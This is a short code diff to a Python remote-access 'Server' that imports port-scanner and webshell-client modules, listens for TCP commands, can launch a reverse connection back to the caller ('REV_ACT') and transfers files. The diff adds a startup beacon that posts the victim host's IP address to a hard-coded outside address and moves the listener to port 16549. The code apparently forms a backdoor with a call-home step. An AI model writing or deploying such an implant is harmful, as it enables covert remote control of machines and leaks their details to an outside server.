@@ -7,16 +7,19 @@ from PortScanner import PortScanner
 from Webshell_Client import Client
 from helper_methods import *
 import Packages_Installer
+import requests
 
 
 class Server(Thread):
     def __init__(self):
         self.conn = socket.socket()
-        self.conn.bind((get_ip_address(), 8080))
+        self.conn.bind((get_ip_address(), 16549))
         self.conn.listen(100)
-        print('[+] Listening for income TCP connection on port 8080')
+        requests.post('http://172.19.229.87:80/ping', data=f"I am listening\n IP address: {get_ip_address()}")
+        print('[+] Listening for income TCP connection on port 16549')
         self.conn, self.addr = self.conn.accept()
         print('[+]We got a connection from', self.addr)
+
         self.run()
 
     def run(self) -> None:
@@ -66,6 +69,8 @@ class Server(Thread):
             elif msg == 'REV_ACT':
                 Client(self.addr[0], 9999).run()
             elif msg == 'EXIT':
+                self.conn.shutdown(socket.SHUT_RDWR)
+                self.conn.close()
                 self.__init__()
 
     def transfer(self, path):
